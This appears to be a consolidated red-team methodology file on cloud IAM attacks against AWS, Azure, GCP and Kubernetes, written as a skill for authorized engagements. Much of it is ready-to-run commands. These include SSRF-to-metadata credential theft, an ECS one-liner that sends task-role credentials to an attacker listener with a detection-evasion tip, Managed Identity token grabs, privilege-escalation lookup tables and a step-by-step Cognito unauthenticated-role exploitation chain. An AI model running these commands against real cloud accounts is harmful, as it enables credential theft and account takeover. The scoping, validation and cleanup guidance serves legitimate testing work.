# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs, misconfigs to look for

- **IMDS-via-SSRF is an active 2025 exploitation trend, not a historical demo.** F5 Labs observed a March 2025 campaign scanning EC2 IMDS through vulnerable web apps (paths `/meta-data/`, `/meta-data/iam/security-credentials/<role>`, `/user-data`); Wiz disclosed in-the-wild **CVE-2025-51591** (Pandoc `<iframe src>` SSRF, CVSS 6.5) used to reach `/latest/meta-data/iam/info` and `/latest/meta-data/iam/security-credentials/`. Mandiant's **UNC2903** used Adminer **CVE-2021-21311** for the same goal. Add `169.254.169.254`, IPv6 `[fd00:ec2::254]`, and these exact paths to every SSRF wordlist.
- **IMDSv2 enforcement gaps:** IAM/SCP condition keys `ec2:MetadataHttpTokens`, `ec2:MetadataHttpEndpoint`, `ec2:MetadataHttpPutResponseHopLimit`. A `RunInstances` policy that omits `HttpTokens: required` leaves IMDSv1 reachable; a hop limit >1 lets a container/pod reach the link-local address and defeats the SSRF mitigation.
- **AWS credential source binding:** SCPs using `aws:EC2InstanceSourceVPC` / `aws:EC2InstanceSourcePrivateIPv4` (with `aws:ViaAWSService` and `ec2:SourceInstanceARN` Null checks) confine instance-role creds to the originating instance. Absence = stolen creds replayable from anywhere.
- **Newer AWS privesc pairs to enumerate beyond classic `iam:PassRole`+Lambda:** `iam:PassRole`+`ecs:RunTask` (command override + `assignPublicIp=ENABLED`), `iam:PassRole`+`ecs:StartTask`/`RegisterContainerInstance`, `iam:PassRole`+`glue:CreateDevEndpoint`, `iam:PassRole`+`datapipeline:CreatePipeline/PutPipelineDefinition/ActivatePipeline`, `iam:UpdateAssumeRolePolicy`+`sts:AssumeRole`, `lambda:UpdateFunctionCode` on an existing privileged function. Security Hub's exposure findings name the same shapes: "Has pass role create executor path", "Has swap role existing executor path", "Has role chain escalation path", "Has inject code privileged executor path", "Has credential minting path".
- **Azure/Entra workload identity — two distinct token surfaces.** VMs: IMDS `169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=...` with header `Metadata: true`. App Services/Functions expose NO link-local IMDS: they inject `IDENTITY_ENDPOINT` + `IDENTITY_HEADER`, and the header must be replayed as `X-IDENTITY-HEADER`. An SSRF/LFI that can read those env vars is therefore the equivalent primitive.
- **GCP:** access tokens minted from a leaked service-account JSON are effectively non-revocable (1-hour life; the only remediation is disabling the SA, which breaks production). Cached tokens live in `~/.config/gcloud/credentials.db`. P4SA (per-product service account) impersonation chains are a 2025 bug-bounty class: a Google SecOps SOAR bugSWAT 2025 winning report escalated from Basic-role "Manual Actions" to full admin via an over-broad `roles/iam.serviceAccountTokenCreator` binding on a GKE-init P4SA.
- **Cognito addendum (extends the section already in this skill):** AWS best practice requires BOTH `cognito-identity.amazonaws.com:aud` AND `:amr` conditions in identity-pool trust policies; a guest role missing either is the misconfiguration to flag. Master switch is "Enable access to unauthenticated identities"; "automatic limitations placed on unauthenticated roles" are weaker than they sound.

## Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

```bash
# IMDSv2 enforcement-check policy (what a HARDENED account looks like — absence = finding)
# SCP condition keys to grep for in exported org policies:
#   ec2:MetadataHttpTokens = required | ec2:MetadataHttpEndpoint = enabled
#   ec2:MetadataHttpPutResponseHopLimit = 1
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,MetadataOptions]' --output table
# Look for HttpTokens=optional and HttpPutResponseHopLimit>1

# AWS source-binding deny (defender-side; its ABSENCE is the exposure)
cat > deny-unbound.json <<'JSON'
{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*",
 "Condition":{"StringNotEquals":{"aws:ec2InstanceSourceVPC":"${aws:SourceVpc}"},
 "Null":{"ec2:SourceInstanceARN":"false"},"BoolIfExists":{"aws:ViaAWSService":"false"},
 "ArnNotLike":{"aws:PrincipalArn":["arn:aws:iam::*:role/aws:ec2-infrastructure"]}}}]}
JSON

# iam:PassRole + ecs:RunTask credential exfil (task role -> attacker listener)
aws ecs run-task --cluster <cluster> --task-definition <def> --launch-type FARGATE \
  --network-configuration 'awsvpcConfiguration={subnets=[<subnet>],securityGroups=[<sg>],assignPublicIp=ENABLED}' \
  --overrides '{"containerOverrides":[{"name":"<container>","command":["sh","-c","curl -s http://169.254.169.254/v2/credentials/ -H X-aws-ec2-metadata-token:$(curl -sX PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600) | curl -X POST -d @- https://<collab>/ecs"]}]}'
# Stealthier: perform ALL API actions inside user-data in one shot; no credential exfil event to detect.

# Azure App Service / Function Managed Identity (no 169.254.169.254 available)
curl -s "$IDENTITY_ENDPOINT/?api-version=2019-08-01&resource=https://management.azure.com/" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | jq -r .access_token
# VM variant for comparison:
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F"

# GCP service-account impersonation chain (P4SA-style over-broad binding)
gcloud iam service-accounts add-iam-policy-binding <target-sa>@<proj>.iam.gserviceaccount.com \
  --member serviceAccount:<source-sa>@<proj>.iam.gserviceaccount.com --role roles/iam.serviceAccountTokenCreator
gcloud --impersonate-service-account=<target-sa>@<proj>.iam.gserviceaccount.com compute instances list
gcloud auth print-access-token --impersonate-service-account=<target-sa>  # short-lived token
```

Token audience triage: decode the JWT payload (`cut -d. -f2 | tr '_-' '/+' | base64 -d`) and check `aud`, `oid`, `xms_mirid` (Azure — reveals exact resource identity + subscription), `exp`. A token scoped to `https://vault.azure.net` is NOT an ARM token — request the right `resource` before claiming subscription impact.

### AWS privesc patterns (24+ documented — `iam_privesc` techniques)

Quick lookup — if you have any of these IAM actions, escalate via the listed technique:

| You have | Escalate via |
|---|---|
| `iam:CreateAccessKey` | Create access key on any user → impersonate |
| `iam:CreateLoginProfile` | Set a console password on a user → login |
| `iam:UpdateLoginProfile` | Reset console password on a user |
| `iam:AttachUserPolicy` | Attach AdministratorAccess to self |
| `iam:AttachGroupPolicy` | Attach AdministratorAccess to a group you're in |
| `iam:AttachRolePolicy` + sts:AssumeRole | Attach to a role you can assume |
| `iam:PutUserPolicy` | Inline AdministratorAccess to self |
| `iam:PutGroupPolicy` | Inline policy on a group |
| `iam:PutRolePolicy` | Inline on a role you can assume |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:UpdateAssumeRolePolicy` + sts:AssumeRole | Modify trust to allow self |
| `iam:CreatePolicyVersion` | Create v2 of an attached policy with admin |
| `iam:SetDefaultPolicyVersion` | Switch attached policy to admin version |
| `iam:PassRole` + ec2:RunInstances | Launch EC2 as admin role → use instance creds |
| `iam:PassRole` + lambda:CreateFunction/InvokeFunction | Run code as admin role |
| `iam:PassRole` + cloudformation:CreateStack | CF stack creates resources as admin |
| `iam:PassRole` + glue:CreateDevEndpoint | Notebook runs as admin role |
| `iam:PassRole` + datapipeline | Pipeline runs as admin role |
| `iam:PassRole` + codestar:CreateProject | New project gets admin role |
| `ec2:RunInstances` (with admin instance profile already on the AMI) | Spin instance, exfil creds from IMDS |
| `lambda:UpdateFunctionCode` (function has admin role) | Replace code → exfil creds |
| `lambda:UpdateFunctionConfiguration` | Add layer / env var that exfils |
| `cloudformation:UpdateStack` | Modify stack to grant self admin |
| `sts:AssumeRole` (where trust allows you) | Direct privilege jump |

Many of the destructive ones are out-of-scope for an external red-team; document the path, don't always execute.

---

## Validation and proof

### AWS — read-only validation (the safe first step)

```bash
# Set credential
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# 1. WHO am I?
aws sts get-caller-identity
# Returns: UserId, Account, Arn
# Arn tells you: IAM user vs role, account ID, name

# 2. WHAT can I do? (the privesc question)
# Try common read-only first — failures still inform you
aws iam list-users 2>&1 | head -5
aws iam list-roles 2>&1 | head -5
aws iam list-policies 2>&1 | head -5
aws iam list-groups 2>&1 | head -5

# 3. WHAT policies are attached to me?
aws iam list-attached-user-policies --user-name <self>
aws iam list-user-policies --user-name <self>          # inline policies
aws iam list-groups-for-user --user-name <self>

# 4. Service-by-service surface
aws ec2 describe-instances --max-items 1 2>&1 | head
aws s3 ls 2>&1 | head -10
aws lambda list-functions --max-items 5 2>&1 | head
aws rds describe-db-instances --max-items 5 2>&1 | head
aws secretsmanager list-secrets --max-results 5 2>&1 | head
aws ssm describe-parameters --max-results 5 2>&1 | head

# 5. Audit any cross-account / external trust
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `arn:aws:iam::`)]' 2>&1 | head -20
```

---

### Azure — credential validation

```bash
# Login with a credential
az login --service-principal -u <appId> -p <password> --tenant <tenantId>
# OR with managed identity (from inside Azure VM)
az login --identity

# Who am I?
az account show

# Subscriptions
az account list --output table

# Role assignments (Azure RBAC)
az role assignment list --assignee <objectId> --all
az role assignment list --all --query '[?principalId==`<objectId>`]' --output table

# Resources I can read
az resource list --output table | head -30
az storage account list --output table
az keyvault list --output table
az vm list --output table
```

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Never report "IMDS reachable" alone.** Prove the full chain: SSRF/LFI → instance/profile or role name → live STS credentials (`ASIA…` + SessionToken) → `aws sts get-caller-identity` showing the role ARN and account ID → at least one privileged action. F5/Wiz/Pandoc cases are the precedents; a bare `169.254.169.254` timeout is not a finding.
- **IMDSv2 nuance:** code execution on the instance retrieves tokens from IMDSv2 just as easily as v1 — the v2 header requirement only mitigates SSRF. Phrase the finding around the reachable primitive and the attached role's permissions, not the protocol version alone.
- **App Service vs VM:** do NOT claim "no IMDS = not vulnerable." Check `IDENTITY_ENDPOINT`/`IDENTITY_HEADER` first. Azure token creation has no dedicated log — TrustOnCloud's detection research shows MI abuse must be detected by baselining sign-in behavior against the identity's normal pattern, so a "no alert fired" observation is not evidence of no abuse.
- **GCP:** an access token is not revocable and a leaked SA JSON keeps minting them. Report the key exposure + SA roles, but do not claim "we revoked it" — validate with `gcloud auth list` and a read-only API call, and note rotation/disable as the client's remediation.
- **P4SA/impersonation:** prove the *chain* end-to-end (`getAccessToken` on a higher SA → an action only that SA can do), not the mere presence of a `roles/iam.serviceAccountTokenCreator` binding — match the Google bugSWAT case.
- **Cognito:** still require all three artifacts from the existing section (`get-caller-identity`, permission enumeration, concrete data pull). `NotAuthorizedException` on `GetId` = unauth disabled = no finding; `Roles` with deny-all policy = Informational only.

## Escalation and related chains

### AWS — STS / cross-account / role chaining

```bash
# Enumerate roles you can assume across accounts
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > /tmp/roles.json
# Parse for "Principal.AWS" containing different account IDs

# Assume a role
aws sts assume-role --role-arn "arn:aws:iam::OTHER_ACCT:role/CrossAccountRole" --role-session-name "rt-1"

# Set new creds
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Verify
aws sts get-caller-identity  # should now show OTHER_ACCT

# Re-enumerate from new identity (chain continues)
```

**Confused-deputy pattern:** look for `sts:ExternalId` missing or trust policies that allow `arn:aws:iam::*:role/*`. If `ExternalId` is not required, anyone can assume the role.

---

### AWS Cognito Identity Pool — Unauthenticated-Role Attack Chain (2024-2026 surface)

AWS Cognito has two distinct services often confused: **User Pools** (auth provider) and **Identity Pools** (federated identity → IAM credentials). Identity Pools can be configured with *"Enable access to unauthenticated identities"* — which gives ANY anonymous caller an IAM role via `cognito-identity:GetId` → `cognito-identity:GetCredentialsForIdentity`. Mobile apps and SPAs ship the IdentityPoolId in the page bundle. Developers commonly attach overly-broad IAM permissions to the unauth role, especially when the pool was set up for AWS Amplify / Pinpoint / CloudWatch RUM and the role policy was never narrowed.

### Related Skills & Chains

- **`ssrf`** — Most external paths to a cloud credential begin with SSRF reaching the metadata service. Chain primitive: SSRF + IMDSv1 → instance role token → `cloud-iam-deep` privilege-escalation patterns reach prod S3 / Secrets Manager.
- **`cloud-misconfig`** — Public buckets and exposed configs are the most common credential-leak vector. Chain primitive: Cloud misconfig (`.env` in public S3) + leaked AWS access key → IAM enumeration → `iam:PassRole` chain to admin.
- **`supply-chain-attack-recon`** — CI/CD often holds long-lived deploy credentials. Chain primitive: Exposed GitHub Actions OIDC misconfig + assume-role permission → `cloud-iam-deep` cross-account role assumption.
- **`m365-entra-attack`** — Azure Managed Identity overlaps Entra service principals. Chain primitive: SSRF on Azure App Service → Managed Identity token → `m365-entra-attack` Graph API enumeration → cross-tenant escalation.
- **`security-arsenal`** — Load the Cloud IAM Privilege-Escalation Payload Pack (24+ AWS, 8+ Azure, 6+ GCP escalation patterns with `aws cli` one-liners).
- **`triage-validation`** — Apply the Server-State-vs-Policy gate: a permissive IAM policy alone is not a finding; demonstrate actual privileged action (e.g., read prod secret, create cross-account role) before reporting.

---

### Related Skills & Chains

- **`hunt-ssrf`** — Most external paths to a cloud credential begin with SSRF reaching the metadata service. Chain primitive: SSRF + IMDSv1 → instance role token → `cloud-iam-deep` privilege-escalation patterns reach prod S3 / Secrets Manager.
- **`hunt-cloud-misconfig`** — Public buckets and exposed configs are the most common credential-leak vector. Chain primitive: Cloud misconfig (`.env` in public S3) + leaked AWS access key → IAM enumeration → `iam:PassRole` chain to admin.
- **`supply-chain-attack-recon`** — CI/CD often holds long-lived deploy credentials. Chain primitive: Exposed GitHub Actions OIDC misconfig + assume-role permission → `cloud-iam-deep` cross-account role assumption.
- **`m365-entra-attack`** — Azure Managed Identity overlaps Entra service principals. Chain primitive: SSRF on Azure App Service → Managed Identity token → `m365-entra-attack` Graph API enumeration → cross-tenant escalation.
- **`security-arsenal`** — Load the Cloud IAM Privilege-Escalation Payload Pack (24+ AWS, 8+ Azure, 6+ GCP escalation patterns with `aws cli` one-liners).
- **`triage-validation`** — Apply the Server-State-vs-Policy gate: a permissive IAM policy alone is not a finding; demonstrate actual privileged action (e.g., read prod secret, create cross-account role) before reporting.

## Tools and wordlists

### Tooling reference

| Tool | Cloud | Purpose |
|---|---|---|
| **Pacu** | AWS | Full red-team framework, 100+ modules |
| **enumerate-iam.py** | AWS | Brute-force list of API calls to discover permissions |
| **PMapper** | AWS | Visualize privesc paths as graph |
| **CloudFox** | AWS | Recon-focused (enumerate resources, no privesc) |
| **Prowler** | AWS/Azure/GCP | Compliance scanning + enumeration |
| **ScoutSuite** | AWS/Azure/GCP/OCI | Multi-cloud audit |
| **AzureHound** | Azure | BloodHound-style graph for Azure |
| **MicroBurst** | Azure | Azure-specific recon and abuse modules |
| **ROADtools** | Azure | Entra ID enumeration toolkit |
| **GCPBucketBrute** | GCP | GCS bucket permission enumeration |
| **gcpwn** | GCP | GCP-specific exploitation framework |
| **Peirates** | K8s | Container/cluster exploitation toolkit |
| **kube-hunter** | K8s | Auto-scan cluster from inside/outside |
| **kubectl-trace** | K8s | Trace processes (post-foothold) |

---

## Sources and related reading

### D. Sources — numbered list of URLs you actually fetched

1. https://www.f5.com/labs/articles/campaign-targets-amazon-ec2-instance-metadata-via-ssrf
2. https://thehackernews.com/2025/09/hackers-exploit-pandoc-cve-2025-51591.html
3. https://builder.aws.com/content/2q1QWCuHPXjCkkjA1cPBHjq7PT7/imdsv1-credential-access
4. https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-transition-to-version-2.html
5. https://docs.aws.amazon.com/securityhub/latest/userguide/exposure-ec2-instance.html
6. https://pwnedlabs.io/blog/aws-privilege-escalation
7. https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation
8. https://specterops.io/blog/2023/02/15/abusing-azure-app-service-managed-identity-assignments
9. https://blog.yunolay.com/azure-managed-identities-abuse
10. https://trustoncloud.com/blog/an-attempt-at-detecting-managed-identity-abuse
11. https://redcanary.com/blog/threat-detection/gcp-service-accounts
12. https://cloud.google.com/iam/docs/service-account-impersonation
13. https://jdsec.cloud/posts/2026-01-17-privilege-escalation-via-a-service-account-impersonation-chain
14. https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools-security-best-practices.html

## Additional notes

### When to use

Trigger when:
- A cloud credential surfaces (key, secret, token, JSON file)
- SSRF chain reaches IMDS / metadata endpoint
- APK / git-leak reveals embedded cloud key
- Recon shows public S3/GCS/Azure-blob with permissions you can verify
- A Kubernetes API or service-account token is exposed
- Post-RCE on a cloud-hosted instance — pivot to cloud control plane

Do NOT use for:
- On-prem-only environments (use AD attack skills — but those are out of scope per external-only boundary)
- Web2 vulns that happen to be on AWS — use the relevant `specialist` skill

---

### Credential identification (first 60 seconds)

```bash
# AWS access key patterns
AKIA[0-9A-Z]{16}                # IAM user access key (long-term)
ASIA[0-9A-Z]{16}                # STS temporary credential
AGPA[0-9A-Z]{16}                # IAM group
AIDA[0-9A-Z]{16}                # IAM user (user-id)
AROA[0-9A-Z]{16}                # IAM role
ANPA[0-9A-Z]{16}                # Managed policy

# AWS secret pattern (40-char base64-ish — context required)
[A-Za-z0-9/+=]{40}              # AWS secret access key

# Azure
AccountKey=[A-Za-z0-9+/=]{86}   # Storage account key
client_secret pattern + UUID    # Azure AD app credential

# GCP service account JSON
{
  "type": "service_account",
  "project_id": "...",
  "private_key_id": "...",
  "private_key": "-----BEGIN PRIVATE KEY-----..."
}

# K8s SA token (JWT format — decode to confirm)
eyJhbGciOiJSUzI1...     # decode kid claim to see issuer
```

---

### AWS IMDSv1 / IMDSv2 abuse via SSRF

```bash
# IMDSv1 (legacy, still common — straight GET):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Returns role name → fetch creds:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# JSON with AccessKeyId, SecretAccessKey, Token, Expiration

# IMDSv2 (requires PUT to get a token first — usually mitigates SSRF):
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
TOKEN=...
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF bypass for IMDSv2:
# Most server-side fetchers don't issue PUT requests → IMDSv2 blocks them.
# Exception: SSRF in functions that themselves perform requests with custom headers.
```

---

### Azure — Managed Identity abuse

```bash
# From inside Azure VM (post-RCE or SSRF to IMDS-equivalent):
# Endpoint: http://169.254.169.254/metadata/identity/oauth2/token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Returns access_token for the Managed Identity. Use:
TOKEN="..."
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Get token for Key Vault
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Get token for Graph
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
# → If Managed Identity has Graph permissions, read all M365 data
```

---

### Azure privesc patterns

| You have | Escalate via |
|---|---|
| `Microsoft.Authorization/roleAssignments/write` on tenant | Self-assign Owner |
| `Microsoft.Authorization/roleDefinitions/write` | Modify role def to add powers |
| `Microsoft.Compute/virtualMachines/runCommand/action` | Run command on VM (with VM's MI) |
| `Microsoft.KeyVault/vaults/secrets/getSecret/action` | Read all KV secrets |
| `Microsoft.Storage/storageAccounts/listkeys/action` | Read all storage blobs |
| `Microsoft.Web/sites/publishxml/action` | Get publish profile → RCE on app |
| `Microsoft.Web/sites/host/listkeys/action` | Func app key → RCE via function trigger |
| `Microsoft.AAD.Directory.* (App reg) + RoleManagement.ReadWrite.Directory` | Grant self Global Admin |

---

### GCP — service account JSON

```bash
# Activate
gcloud auth activate-service-account --key-file=sa-leaked.json

# Who am I?
gcloud auth list
gcloud config get-value account
gcloud config get-value project

# What roles does this SA have? (project-level only — not org-level)
gcloud projects get-iam-policy <projectId> \
  --flatten="bindings[].members" \
  --format="table(bindings.role)" \
  --filter="bindings.members:<sa-email>"

# Service-by-service:
gcloud compute instances list 2>&1 | head
gcloud storage buckets list 2>&1 | head
gcloud secrets list 2>&1 | head
gcloud functions list 2>&1 | head
gcloud sql instances list 2>&1 | head
gcloud container clusters list 2>&1 | head
```

---

### GCP privesc patterns

| You have | Escalate via |
|---|---|
| `iam.serviceAccounts.getAccessToken` on higher-priv SA | Get token for that SA |
| `iam.serviceAccounts.implicitDelegation` | Chain through delegate SAs |
| `iam.serviceAccounts.signBlob` / `signJwt` on higher SA | Forge JWT for that SA |
| `iam.serviceAccountKeys.create` | Create new key for any SA → impersonate |
| `iam.serviceAccounts.setIamPolicy` | Grant self impersonation rights |
| `iam.roles.update` (on custom role) | Add admin permissions to a role you have |
| `cloudfunctions.functions.update` (function runs as high-priv SA) | Replace code → exfil creds |
| `cloudfunctions.functions.call` + above | Trigger replacement |
| `compute.instances.setMetadata` | Add ssh-keys metadata → SSH as root |
| `compute.instances.setServiceAccount` | Attach higher-priv SA to instance |
| `cloudbuild.builds.create` (build runs as project SA) | Build executes attacker code |
| `deploymentmanager.deployments.create` | Resources created as DM SA |

---

### GCP IMDS attack (via SSRF or post-RCE)

```bash
# GCP IMDS endpoint:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Returns access token. Use:
TOKEN=...
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

---

### Kubernetes — exposed API / SA token

```bash
# Check anonymous access on K8s API
curl -sk "https://k8s.target.com:6443/api/v1/namespaces"

# Anonymous binding (system:anonymous user) — surprisingly common
curl -sk "https://k8s.target.com:6443/api/v1/pods?limit=1"

# If SA token exfil'd (eyJ...):
export TOKEN="eyJ..."
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get namespaces
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify auth can-i --list
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get pods -A
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get secrets -A
```

### K8s privesc patterns

| You have | Escalate via |
|---|---|
| `pods/exec` on high-priv pod | exec into pod with admin SA token |
| `pods/create` + `serviceaccounts/use` | Create pod mounting admin SA token |
| `secrets/get` | Read any service-account token in cluster |
| `clusterrolebindings/create` | Grant self cluster-admin |
| `roles/escalate` or `clusterroles/escalate` | Add permissions to role |
| `nodes/proxy` | Proxy to kubelet on any node → exec via kubelet |
| `bind` verb on roles | Bind a role you don't have to a subject |
| `impersonate` on users/groups/SAs | Operate as another principal |

---

### Anti-patterns

- **DO NOT run write/delete operations without explicit OK** — IAM mutation is destructive and audit-visible
- **DO NOT enumerate everything in scope of an account** — `aws iam list-users` against an account with 50,000 users is loud and slow
- **DO NOT use `aws *` with non-test creds without confirming you have the right account** — accidentally hitting prod = career risk
- **DO NOT confuse "I have the credential" with "this credential is current"** — always check expiration / rotation via STS first
- **DO NOT assume an STS token from one account works across accounts** — region restrictions and trust policies apply
- **DO NOT skip CloudTrail/Activity Log awareness** — every API call is logged; pair with `mid-engagement-ir-detection`
- **DO NOT pivot deeper than the SOW allows** — discovering admin creds doesn't mean using them; some engagements are read-only

---

### Bridge to neighboring skills

- `cloud-misconfig` — finds the credentials in the first place (public buckets, IMDS via SSRF, leaked JSON)
- `ssrf` — SSRF→IMDS is the canonical chain into cloud control plane
- `apk-redteam-pipeline` — APK secret extraction commonly yields cloud creds
- `supply-chain-attack-recon` — CI/CD pipelines store cloud creds; finding them is a separate workflow
- `m365-entra-attack` — Azure cross-product; Managed Identity tokens cross over to Graph
- `mid-engagement-ir-detection` — cloud control plane activity is monitored; expect mitigations

---

### Severity scoring guidance

| Finding | Severity |
|---|---|
| AWS access key with `*:*` in policy → confirmed admin | Critical |
| GCP SA JSON with `roles/owner` on production project | Critical |
| Azure MI on internet-exposed VM with Owner role | Critical |
| Leaked cred with read-only on prod data store | High (or Critical depending on data sensitivity) |
| Leaked cred with privesc path but no admin yet | High |
| Leaked cred — read access only to non-sensitive | Medium |
| Anonymous public bucket — listing only | Low/Medium |
| Anonymous bucket — write permission | High |

---

### Cleanup discipline (deliverable hygiene)

If during the engagement you:
- Used `sts:AssumeRole` to chain — note the role names and times in IoCs
- Created any IAM resources (test users, roles, policies) — list them with explicit cleanup confirmation
- Read sensitive data (Secrets Manager, KMS keys, Storage blob content) — note in deliverable that data was viewed but not exfiltrated outside the engagement systems

Cloud activity is trivially auditable; the client WILL find it post-engagement. Documenting now > getting blindsided later.

---

### Step 1 — Discover the IdentityPoolId

The IdentityPoolId is a **public identifier** by AWS design (`<region>:<UUID>` format). The find:

```bash
# JS bundle / SPA regex (against *.js, *.html, source-map files)
grep -ErohE "identityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
grep -ErohE "IdentityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
grep -ErohE "\"PoolId\"\s*:\s*\"([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})\"" .

# Mobile APK (after jadx decompile)
grep -rEi "identity[_-]?pool[_-]?id" decoded/
grep -rE "\"[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}\"" decoded/

# Also check
amplifyconfiguration.json
awsconfiguration.json
aws-exports.js
.env.js
*.js.map
```

Wayback CDX captures, GitHub code-search for the apex domain + `IdentityPoolId`, and JS chunks linked from `index.html` are the high-yield search corpora.

### Step 2 — `GetId` (unauth)

```bash
aws cognito-identity get-id \
  --identity-pool-id us-east-1:abcd1234-5678-90ab-cdef-1234567890ab \
  --region us-east-1 \
  --no-sign-request
```

`--no-sign-request` is critical — tells the CLI not to look for ambient AWS credentials. Returns `{"IdentityId": "us-east-1:<uuid>"}`. If this returns `NotAuthorizedException`, unauth identities are disabled — stop, not exploitable.

### Step 3 — `GetCredentialsForIdentity`

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:<returned-uuid> \
  --region us-east-1 \
  --no-sign-request
```

Returns real STS credentials with ~1 hour TTL: `AccessKeyId` (ASIA…), `SecretKey`, `SessionToken`, `Expiration`.

### Step 4 — Confirm role ARN

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

Returns role ARN like `arn:aws:sts::<account>:assumed-role/Cognito_<PoolName>Unauth_Role/CognitoIdentityCredentials`. Account ID is now disclosed.

### Step 5 — Enumerate role permissions

Direct (rare):
```bash
aws iam get-role --role-name Cognito_<PoolName>Unauth_Role
aws iam list-role-policies --role-name Cognito_<PoolName>Unauth_Role
aws iam list-attached-role-policies --role-name Cognito_<PoolName>Unauth_Role
```

Blackbox (the normal case) — fire a permission probe across high-value services and observe `AccessDenied` vs success. Pacu's `iam__enum_permissions --role-name <name>` brute-forces ~500 IAM actions; `enumerate-iam.py` by Andrés Riancho covers ~1000. Common over-permissions: `s3:Get*`/`s3:List*`, `dynamodb:Scan`, `lambda:InvokeFunction`, `appsync:GraphQL`, `cognito-idp:AdminCreateUser`, `iam:PassRole`, `kms:Decrypt`.

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| Unauth role with `*:*` or `AdministratorAccess` | **Critical** (9.8+) | Full AWS account takeover |
| Unauth role with `s3:Get*` / `s3:List*` on production customer buckets, or `dynamodb:Scan` on user tables | **Critical** (9.1-9.8) | Mass PII / data breach |
| Unauth role with `appsync:GraphQL` on production API, or `lambda:InvokeFunction` on internal lambdas | **Critical** (9.0) | Authenticated backend access |
| Unauth role with `cognito-idp:Admin*` on the linked User Pool | **Critical** (9.1) | Mass ATO primitive |
| Unauth role with `iam:PassRole` + create-function | **Critical** (9.8) | Documented priv-esc to admin |
| Unauth role with `s3:PutObject` on web-hosting bucket | **High** (8.1) | Stored XSS / supply-chain |
| Unauth role with `kms:Decrypt` on a customer CMK | **High** (7.5-8.5) | Depends on ciphertext reachability |
| Unauth role with read-only on a single hardcoded non-sensitive resource | **Medium** (5.3) | Limited business impact |
| Unauth identities enabled but role policy denies everything | **Informational** | Best-practice deviation only |

### Disclosed cases / authoritative writeups

1. **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020, refreshed 2023)** — original research establishing the attack class. `GetCredentialsForIdentity` against unauth pools with default `*` policies. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
2. **Rhino Security Labs — Pacu `cognito__enum_identity_pools` module** — production tooling that automates Steps 1-5 of the chain. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu/tree/master/pacu/modules/cognito__enum_identity_pools)
3. **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — walkthrough of identityPoolId extraction → assume guest role → S3/DynamoDB/Lambda enumeration. Calls out RUM, Amplify, Pinpoint as the three SDKs that commonly expose the pool ID in HTML. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
4. **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook covering Steps 1-5. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
